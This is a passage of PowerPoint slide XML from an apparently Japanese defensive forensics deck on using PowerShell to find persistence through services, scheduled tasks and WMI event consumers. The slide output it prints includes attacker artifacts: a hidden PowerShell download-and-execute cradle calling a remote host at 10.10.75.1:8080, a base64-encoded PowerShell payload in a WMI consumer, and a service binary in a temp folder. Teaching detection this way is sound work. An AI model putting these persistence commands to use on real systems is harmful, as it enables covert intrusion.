                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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 i="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097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i="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New-Service</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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 i="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76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i="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Set-Service</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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 i="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21301"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E02FF04-F60A-DE66-BCFE-E53FD4462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9" y="915867"/>
            <a:ext cx="7631970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サービスをスタート区分で分類する。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81C276C-0D23-EBD6-BE14-AFA38FA0D048}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1273984"/>
            <a:ext cx="7371249" cy="20928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Get-Service | Group-Object -Property </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>StartType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Count Name      Group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----- ----      -----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  190 Manual    {AarSvc_3fb40, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>AJRouter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, ALG...}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   12 Disabled  {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>AppVClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DialogBlocking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.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   62 Automatic {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>AudioEndpointBuilder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, Audi.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr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9A00FBDA-8620-F4AB-F265-4AD74C0DB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9" y="3634654"/>
            <a:ext cx="7631970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コマンドライン表示には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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>CimInstance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が必要。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092DF59-2165-0FD4-FF62-24BFEE51DDCB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="3992771"/>
            <a:ext cx="7371249" cy="1938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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CimInstance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ClassName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Win32_Service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Select-Object Name, Caption, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PathName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1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .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Name     : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lHYbDaM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Caption  : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>wteTLrWXyqkWn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PathName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> : "C:\WINDOWS\TEMP\GgYyVs.exe" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NsLlfKUV</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0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EC1FC42-35E8-D0BB-02D1-019EBF42B2C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="942657" y="4971463"/>
            <a:ext cx="7241575" cy="905809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DF4AE67C-543B-E307-29B5-76F8D4F36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8996" y="4077072"/>
            <a:ext cx="2628292" cy="677108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900"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Remove-Service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は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PS5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にはない。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="467772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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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永続化 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>スケジュール</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>タスク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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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40</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DC00B91B-8C31-93C6-3E42-3365B0635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9" y="915867"/>
            <a:ext cx="7631970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特定のスケジュールタスクの詳細を確認する。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FAB09EE-1427-7BFB-FDD0-9BCB54F38CC9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1273984"/>
            <a:ext cx="10430709" cy="38162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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ScheduledTask</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>TaskName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>OfficeUpdater</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Format-Custom</a:t>
            </a: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class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CimInstance#Root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/Microsoft/Windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>TaskScheduler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>MSFT_ScheduledTask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{ Actions =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    [ class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CimInstance#Root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/Microsoft/Windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>TaskScheduler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/MSFT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      _</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>TaskExecAction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      { Id =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        Arguments = -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WindowStyle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> hidden -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NoLogo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NonInteractive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        -ep bypass -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>nop</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -c "IEX ((new-object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>net.webclient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>downl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        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>oadstring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(""http://10.10.75.1:8080/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>SkSaiYJdWgN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"""))"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        Execute =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        c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .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0046AEE-FB6E-12E2-1763-A4E9C9EEA0BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2027548" y="3320988"/>
            <a:ext cx="8316924" cy="1584176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2ACD7F2D-4806-EF03-BC3C-5917D43BD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682" y="5236168"/>
            <a:ext cx="10439401" cy="677108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Format-Custom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をパラメーターなしで使うと、入れ子のプロパティを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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>展開して表示する。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28766092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02DB60-3085-B1F5-1663-5330D95BA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永続化 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| WMI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>イベントコンシューマー</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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6F993D3-5451-8596-7F85-56D9FA83B5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A5436F-F6C2-47FB-ABB6-725975A56B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41</a:t>
            </a:fld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448911F-D1EE-DD77-5354-8D97661C09EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1273985"/>
            <a:ext cx="10430709" cy="40992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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CimInstance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Namespace root\Subscription `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-Class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CommandLineEventConsumer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CreatorSID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            : {1, 5, 0, 0...}</a:t>
            </a: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MachineName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>           :</a:t>
            </a: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MaximumQueueSize</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      :</a:t>
            </a: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CommandLineTemplate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>   : powershell.exe -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>nop</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -w hidden -noni -e </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>aQBm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                        ACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACA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                        ALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcg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                        BzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7A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                        CQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcA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                        XABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwB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                        zAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAF</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .</a:t>
            </a:r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84682447-1590-061B-D3B7-7CA006A73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9" y="915867"/>
            <a:ext cx="7631970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WMI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イベントコンシューマーの一覧を確認する。</a:t>
            </a:r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885F0882-705B-C441-AD50-D3E6D4DFA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990" y="5502714"/>
            <a:ext cx="10439401" cy="677108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不審な永続化は、発火条件が記されているイベントフィルターよりも、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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>コマンドが記載されているイベントコンシューマーから探すほうが楽。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EFA400B-79F0-3B68-5067-5AE454C4DB8C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4223792" y="2996952"/>
            <a:ext cx="6264696" cy="2196244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001379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5D6B80-767A-AAA9-E110-277DE0D3F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永続化 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| Base64 Encode/Decode</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>.NET</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>の利用）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8ACBACD-A4A3-5089-04D7-4A10D5FA0F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8DF58D3-47CD-7E14-6E98-30B2D58861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42</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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AC2B130B-5374-A3F9-D751-72CFE7521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915867"/>
            <a:ext cx="10512290" cy="677108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Base64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をエンコード・デコードする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Cmdlet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は提供されていない。</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>.NET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のメソッドを使って文字列 ⇔ バイト配列 ⇔ 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Base64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文字列の変換が必要。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318F5E6-262F-0382-EF03-A805DD1FAC7F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="4213537"/>
            <a:ext cx="10439401" cy="10156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Write-Output SGVsbG8= | </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ForEach</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Object {, [Convert]::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>FromBase64String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>($_)}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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ForEach</a:t>
